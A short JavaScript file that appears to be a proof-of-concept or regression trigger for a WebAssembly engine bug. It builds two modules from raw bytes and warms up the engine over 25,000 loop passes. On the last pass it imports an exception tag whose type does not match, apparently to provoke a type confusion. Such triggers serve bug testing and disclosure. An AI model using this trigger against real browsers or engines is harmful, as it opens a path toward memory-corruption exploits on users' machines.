const wasm_A_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 95, 0, 96, 1, 108, 0, 0, 7, 7, 1, 3, 116, 97, 103, 4, 0, 13, 4, 1, 0, 1]);
const wasm_B_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 10, 2, 96, 1, 111, 0, 96, 0, 0, 2, 13, 1, 3, 101, 110, 118, 3, 116, 97, 103, 4, 0, 0, 3, 2, 1, 1, 7, 7, 1, 3, 114, 117, 110, 0, 0, 10, 4, 1, 2, 0, 11]);

const moduleA = new WebAssembly.Module(wasm_A_bytes);
const moduleB = new WebAssembly.Module(wasm_B_bytes);

const instanceA = new WebAssembly.Instance(moduleA);
const subtype_tag = instanceA.exports.tag;
const correct_tag = new WebAssembly.Tag({
    'parameters': ['anyref']
});

let trigger = false;
for (let i = 0; i < 25000; i++) {
    if (i === 24999) {
        trigger = true;
    }
    try {
        const imports = {
            env: {
                tag: trigger ? subtype_tag : correct_tag
            }
        };
        new WebAssembly.Instance(moduleB, imports);
    } catch (e) {}
}